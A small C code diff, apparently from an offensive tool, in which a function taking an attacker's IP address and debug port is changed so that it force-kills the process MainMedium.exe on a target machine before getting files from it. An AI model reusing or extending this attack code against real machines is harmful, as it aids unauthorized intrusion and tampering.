@@ -6,7 +6,7 @@ BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char
 		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
 		return FALSE;
 	}
-	if (system("taskkill /IM MainMedium.exe") == -1) {
+	if (system("taskkill /F /IM MainMedium.exe") == -1) {
 		printf("[-] Failed execution of initial termination command of MainMedium.exe - %d\n", GetLastError());
 		return FALSE;
 	}
